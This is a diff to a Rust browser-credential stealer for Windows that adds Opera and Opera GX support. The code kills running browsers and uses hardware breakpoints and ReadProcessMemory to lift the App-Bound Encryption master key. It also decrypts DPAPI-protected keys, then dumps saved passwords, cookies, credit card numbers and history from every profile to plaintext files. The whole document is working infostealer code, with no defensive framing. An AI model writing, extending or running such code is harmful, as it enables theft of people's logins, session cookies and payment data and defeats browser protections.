@@ -18,15 +18,16 @@ use chrono::{Utc};
 
 struct BrowserConfig {
     name: &'static str,
+    process_name: &'static str,
     exe_paths: &'static [&'static str],
     dll_name: &'static str,
     user_data_subdir: &'static [&'static str],
     output_dir: &'static str,
     temp_prefix: &'static str,
-    use_r14: bool, // true for Edge, false for Chrome (uses R15)
+    use_r14: bool,
+    use_roaming: bool,
+    has_abe: bool,
 }
-
-// Some missing definitions from windows-sys that might be architecture specific or in other modules
 #[repr(C)]
 #[derive(Copy, Clone)]
 pub struct IMAGE_DOS_HEADER {
@@ -276,6 +277,7 @@ fn main() {
     let configs = vec![
         BrowserConfig {
             name: "Google Chrome",
+            process_name: "chrome.exe",
             exe_paths: &[
                 "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                 "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
@@ -285,9 +287,12 @@ fn main() {
             output_dir: "chrome_extract",
             temp_prefix: "chrome_tmp",
             use_r14: false,
+            use_roaming: false,
+            has_abe: true,
         },
         BrowserConfig {
             name: "Microsoft Edge",
+            process_name: "msedge.exe",
             exe_paths: &[
                 "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                 "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
@@ -297,9 +302,12 @@ fn main() {
             output_dir: "edge_extract",
             temp_prefix: "edge_tmp",
             use_r14: true,
+            use_roaming: false,
+            has_abe: true,
         },
         BrowserConfig {
             name: "Brave",
+            process_name: "brave.exe",
             exe_paths: &[
                 "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                 "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
@@ -309,6 +317,40 @@ fn main() {
             output_dir: "brave_extract",
             temp_prefix: "brave_tmp",
             use_r14: false,
+            use_roaming: false,
+            has_abe: true,
+        },
+        BrowserConfig {
+            name: "Opera Stable",
+            process_name: "opera.exe",
+            exe_paths: &[
+				"C:\\Users\\Kemal\\AppData\\Local\\Programs\\Opera\\opera.exe",
+                "C:\\Program Files\\Opera\\launcher.exe",
+                "C:\\Program Files (x86)\\Opera\\launcher.exe",
+            ],
+            dll_name: "launcher_lib.dll",
+            user_data_subdir: &["Opera Software", "Opera Stable"],
+            output_dir: "opera_extract",
+            temp_prefix: "opera_tmp",
+            use_r14: false,
+            use_roaming: true,
+            has_abe: false,
+        },
+        BrowserConfig {
+            name: "Opera GX",
+            process_name: "opera.exe",
+            exe_paths: &[
+				"C:\\Users\\Kemal\\AppData\\Local\\Programs\\Opera GX\\opera.exe",
+                "C:\\Program Files\\Opera GX\\launcher.exe",
+                "C:\\Program Files (x86)\\Opera GX\\launcher.exe",
+            ],
+            dll_name: "launcher_lib.dll",
+            user_data_subdir: &["Opera Software", "Opera GX Stable"],
+            output_dir: "operagx_extract",
+            temp_prefix: "operagx_tmp",
+            use_r14: false,
+            use_roaming: true,
+            has_abe: false,
         },
     ];
 
@@ -316,10 +358,12 @@ fn main() {
         kill_processes_by_name("chrome.exe");
         kill_processes_by_name("msedge.exe");
         kill_processes_by_name("brave.exe");
+        kill_processes_by_name("opera.exe");
+        kill_processes_by_name("launcher.exe");
     }
 
     for config in configs {
-        let user_data_dir = match get_user_data_dir(config.user_data_subdir) {
+        let user_data_dir = match get_user_data_dir(config.user_data_subdir, config.use_roaming) {
             Some(d) => d,
             None => {
                 println!("User data directory not found for {}, skipping...", config.name);
@@ -344,6 +388,27 @@ fn main() {
         };
 
         println!("Processing {}...", config.name);
+
+        let v10_key_res = get_v10_key(&user_data_dir);
+        let mut should_debug = config.has_abe;
+
+        if let Some((key, is_dpapi)) = v10_key_res {
+            if is_dpapi && !config.has_abe {
+                println!("Found DPAPI key for {}, extracting immediately...", config.name);
+                extract_all_profiles_data(None, &config, &user_data_dir);
+                should_debug = false;
+            } else if !is_dpapi && !config.has_abe {
+                // If it's v20 but we didn't expect ABE, it might be a newer Opera or misconfig
+                // Try to extract anyway if we got a key
+                println!("Found ABE key for {}, extracting immediately...", config.name);
+                extract_all_profiles_data(Some(key), &config, &user_data_dir);
+                should_debug = false;
+            }
+        }
+
+        if !should_debug && !config.has_abe {
+            continue;
+        }
 
         unsafe {
             let mut si: STARTUPINFOW = zeroed();
@@ -629,18 +694,20 @@ unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
     CloseHandle(h_thread);
 }
 
-fn get_v10_key(user_data_dir: &Path) -> Option<[u8; 32]> {
+fn get_v10_key(user_data_dir: &Path) -> Option<([u8; 32], bool)> {
     let local_state_path = user_data_dir.join("Local State");
     let content = fs::read_to_string(&local_state_path).ok()?;
     let json: serde_json::Value = serde_json::from_str(&content).ok()?;
     let encrypted_key_b64 = json["os_crypt"]["encrypted_key"].as_str()?;
     let encrypted_key = base64_decode(encrypted_key_b64)?;
 
-    if !encrypted_key.starts_with(b"DPAPI") {
-        return None;
-    }
+    let is_dpapi = encrypted_key.starts_with(b"DPAPI");
 
-    let encrypted_blob = &encrypted_key[5..];
+    let encrypted_blob = if is_dpapi {
+        &encrypted_key[5..]
+    } else {
+        &encrypted_key
+    };
     let mut input = CRYPT_INTEGER_BLOB {
         cbData: encrypted_blob.len() as u32,
         pbData: encrypted_blob.as_ptr() as *mut _,
@@ -657,7 +724,7 @@ fn get_v10_key(user_data_dir: &Path) -> Option<[u8; 32]> {
             if key_slice.len() == 32 {
                 key.copy_from_slice(key_slice);
                 LocalFree(output.pbData as *mut _);
-                return Some(key);
+                return Some((key, is_dpapi));
             }
             LocalFree(output.pbData as *mut _);
         }
@@ -679,9 +746,13 @@ fn base64_decode(input: &str) -> Option<Vec<u8>> {
     None
 }
 
-fn get_user_data_dir(subdir: &[&str]) -> Option<PathBuf> {
-    let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
-    let mut path = PathBuf::from(local_app_data);
+fn get_user_data_dir(subdir: &[&str], use_roaming: bool) -> Option<PathBuf> {
+    let app_data = if use_roaming {
+        std::env::var("APPDATA").ok()?
+    } else {
+        std::env::var("LOCALAPPDATA").ok()?
+    };
+    let mut path = PathBuf::from(app_data);
     for component in subdir {
         path.push(component);
     }
@@ -711,7 +782,7 @@ fn discover_profiles(user_data_dir: &Path) -> Vec<String> {
     profiles
 }
 
-fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>) -> Option<Vec<u8>> {
+fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, is_opera: bool) -> Option<Vec<u8>> {
     if blob.is_empty() {
         return None;
     }
@@ -719,10 +790,34 @@ fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<
     if blob.starts_with(b"v10") && blob.len() > 15 {
         if let Some(cipher) = v10_cipher {
             let nonce = Nonce::from_slice(&blob[3..15]);
-            return cipher.decrypt(nonce, &blob[15..]).ok();
+            if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                if is_opera && dec.len() > 32 {
+                    return Some(dec[32..].to_vec());
+                }
+                return Some(dec);
+            }
+        }
+        if let Some(cipher) = v20_cipher {
+            let nonce = Nonce::from_slice(&blob[3..15]);
+            if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                if is_opera && dec.len() > 32 {
+                    return Some(dec[32..].to_vec());
+                }
+                return Some(dec);
+            }
         }
     } else if blob.starts_with(b"v20") && blob.len() > 15 {
         if let Some(cipher) = v20_cipher {
+            let nonce = Nonce::from_slice(&blob[3..15]);
+            if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                // v20 (App-Bound) has a 32-byte header in the decrypted plaintext
+                if dec.len() > 32 {
+                    return Some(dec[32..].to_vec());
+                }
+                return Some(dec);
+            }
+        }
+        if let Some(cipher) = v10_cipher {
             let nonce = Nonce::from_slice(&blob[3..15]);
             if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
                 // v20 (App-Bound) has a 32-byte header in the decrypted plaintext
@@ -769,7 +864,7 @@ fn copy_and_open_db(db_path: &Path, prefix: &str) -> Option<(Connection, PathBuf
     }
 }
 
-fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str) {
+fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str, is_opera: bool) {
     let db_path = profile_path.join("Login Data");
     if !db_path.exists() { return; }
 
@@ -780,7 +875,7 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<
 
             for row in rows.flatten() {
                 let (url, user, blob) = row;
-                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher) {
+                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher, is_opera) {
                     writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, String::from_utf8_lossy(&dec)).unwrap();
                 }
             }
@@ -789,7 +884,7 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<
     }
 }
 
-fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str) {
+fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str, is_opera: bool) {
     let mut db_path = profile_path.join("Network").join("Cookies");
     if !db_path.exists() {
         db_path = profile_path.join("Cookies");
@@ -803,10 +898,12 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&A
 
             for row in rows.flatten() {
                 let (host, name, value, blob) = row;
-                let cookie_val = if !value.is_empty() {
-                    value
-                } else if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher) {
+                let decrypted = decrypt_blob(&blob, v10_cipher, v20_cipher, is_opera);
+
+                let cookie_val = if let Some(dec) = decrypted {
                     String::from_utf8_lossy(&dec).to_string()
+                } else if !value.is_empty() {
+                    value
                 } else {
                     String::new()
                 };
@@ -820,7 +917,7 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&A
     }
 }
 
-fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str) {
+fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>, temp_prefix: &str, is_opera: bool) {
     let db_path = profile_path.join("Web Data");
     if !db_path.exists() { return; }
 
@@ -851,7 +948,7 @@ fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&
             let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, i32>(1)?, row.get::<_, i32>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();
             for row in rows.flatten() {
                 let (name, m, y, blob) = row;
-                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher) {
+                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher, is_opera) {
                     writeln!(file, "Card: {} | Exp: {}/{} | Num: {}", name, m, y, String::from_utf8_lossy(&dec)).unwrap();
                 }
             }
@@ -880,14 +977,16 @@ fn extract_history(profile_path: &Path, output_dir: &Path, temp_prefix: &str) {
     }
 }
 
-fn extract_all_profiles_data(v20_key: &[u8; 32], config: &BrowserConfig, user_data_dir: &Path) {
-    let v10_key = get_v10_key(user_data_dir);
-    let v10_cipher = v10_key.as_ref().map(|k| Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(k)));
-    let v20_cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(v20_key));
+fn extract_all_profiles_data(v20_key: Option<[u8; 32]>, config: &BrowserConfig, user_data_dir: &Path) {
+    let v10_key_res = get_v10_key(user_data_dir);
+    let v10_cipher = v10_key_res.as_ref().map(|k| Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&k.0)));
+    let v20_cipher = v20_key.as_ref().map(|k| Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(k)));
 
     let profiles = discover_profiles(user_data_dir);
     let extract_root = Path::new(config.output_dir);
     let _ = fs::create_dir_all(extract_root);
+
+    let is_opera = config.name.contains("Opera");
 
     for profile_name in profiles {
         println!("Extracting data for profile: {}", profile_name);
@@ -895,9 +994,9 @@ fn extract_all_profiles_data(v20_key: &[u8; 32], config: &BrowserConfig, user_da
         let output_dir = extract_root.join(&profile_name);
         let _ = fs::create_dir_all(&output_dir);
 
-        extract_passwords(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher), config.temp_prefix);
-        extract_cookies(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher), config.temp_prefix);
-        extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher), config.temp_prefix);
+        extract_passwords(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
+        extract_cookies(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
+        extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), v20_cipher.as_ref(), config.temp_prefix, is_opera);
         extract_history(&profile_path, &output_dir, config.temp_prefix);
     }
     println!("Extraction complete. Data saved in {} folder.", config.output_dir);
@@ -933,7 +1032,7 @@ unsafe fn extract_key(thread_id: u32, h_process: HANDLE, config: &BrowserConfig,
                 if ReadProcessMemory(h_process, data_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
                     if key.iter().any(|&b| b != 0) {
                         println!("Extracted Master Key from 0x{:X}", data_ptr);
-                        extract_all_profiles_data(&key, config, user_data_dir);
+                        extract_all_profiles_data(Some(key), config, user_data_dir);
                         success = true;
                         break;
                     }
